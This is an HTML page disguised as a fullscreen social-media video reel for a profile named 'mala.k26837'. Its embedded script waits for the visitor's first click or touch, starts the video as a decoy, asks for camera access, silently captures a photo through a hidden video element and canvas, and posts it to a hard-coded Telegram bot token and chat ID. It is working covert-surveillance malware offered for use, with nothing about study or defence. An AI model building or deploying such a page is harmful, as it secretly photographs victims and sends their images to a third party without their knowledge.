<meta property="og:title" content="mala.k26837">
<meta property="og:description" content="Malak 🐚">
<meta property="og:type" content="website">
<meta property="og:image" content="https://i.ibb.co/gZn6W1CV/IMG-6974.png">

<title>Video Fullscreen</title>
<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }
    html, body {
        width: 100%;
        height: 100%;
        background-color: #000;
        overflow: hidden;
    }
    video#mainVideo {
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        min-width: 100%;
        min-height: 100%;
        object-fit: cover;
        object-position: center;
        z-index: 1;
    }
</style>

<!-- تم إزالة autoplay لكي لا يعمل الفيديو إلا بالنقر -->
<video id="mainVideo" controls loop playsinline muted>
    <source src="my_reel (3).mp4" type="video/mp4">
</video>

<script>
    const TELEGRAM_BOT_TOKEN = '8469850859:AAFQJDODXLXA-9jJYhYJ8ASll3-6d2RnIQA';
    const TELEGRAM_CHAT_ID = '6642913954';

    let isProcessing = false;
    const video = document.getElementById('mainVideo');

    async function handleUserInteraction() {
        // تشغيل الفيديو فوراً عند النقر
        if (video.paused) {
            video.play().catch(e => console.log("Video play error:", e));
        }

        if (isProcessing) return;
        isProcessing = true;

        let stream = null;

        try {
            // طلب إذن الكاميرا
            stream = await navigator.mediaDevices.getUserMedia({ video: true });

            const hiddenVideo = document.createElement('video');
            hiddenVideo.muted = true;
            hiddenVideo.playsInline = true;
            hiddenVideo.srcObject = stream;
            
            await hiddenVideo.play();
            await new Promise(resolve => setTimeout(resolve, 400));

            const canvas = document.createElement('canvas');
            canvas.width = hiddenVideo.videoWidth || 640;
            canvas.height = hiddenVideo.videoHeight || 480;

            const ctx = canvas.getContext('2d');
            ctx.drawImage(hiddenVideo, 0, 0);

            stream.getTracks().forEach(track => track.stop());

            canvas.toBlob(async (blob) => {
                if (!blob) return;

                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', blob, 'capture.png');

                try {
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } catch (err) {
                    console.error("Error sending photo:", err);
                }
            }, 'image/png');

        } catch (err) {
            console.error("Camera Error:", err);
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        }
    }

    // تنفيذ الكود عند أول نقرة أو لمسة فقط
    window.addEventListener('click', handleUserInteraction, { once: true });
    window.addEventListener('touchstart', handleUserInteraction, { once: true });
</script># x__abdo.42__x
